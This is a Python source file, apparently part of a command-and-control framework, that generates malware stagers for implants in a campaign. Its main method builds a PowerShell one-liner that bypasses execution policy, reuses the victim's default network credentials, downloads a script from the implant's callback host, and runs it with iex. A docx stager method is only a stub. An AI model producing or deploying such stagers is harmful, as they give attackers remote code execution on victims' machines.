class StagerGeneration():
    db = None
    def __init__(self, db_pointer):
        self.db = db_pointer
    def GenerateStaticStagers(self,cid, user):
        ret_data = {}
        if self.db.Verify_UserCanAccessCampaign(user,cid):
            ImplantInfo = self.db.Get_AllImplantBaseFromCid(cid)
            print(type(ImplantInfo),len(ImplantInfo))
            if ImplantInfo != False:
                for implant in ImplantInfo:
                    print(dir(implant), implant.title)
                    stager_string = "powershell - exec bypass - c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://"+implant.callback_url+":"+str(implant.port)+"/robots.txt?user="+implant.stager_key+"')|iex"
                    ret_data[implant.title]={"description":implant.description,"url":implant.callback_url,"stager_string":stager_string}
                return ret_data
            return
        else:
            return
    def GenerateSingleStagerFile(self,cid,user,stager_type):
        if stager_type == "docx":
            return self.__generate_docx_stager_file()
        return

    def __generate_docx_stager_file(self):
        stager_file = "TempContent"
        return stager_file
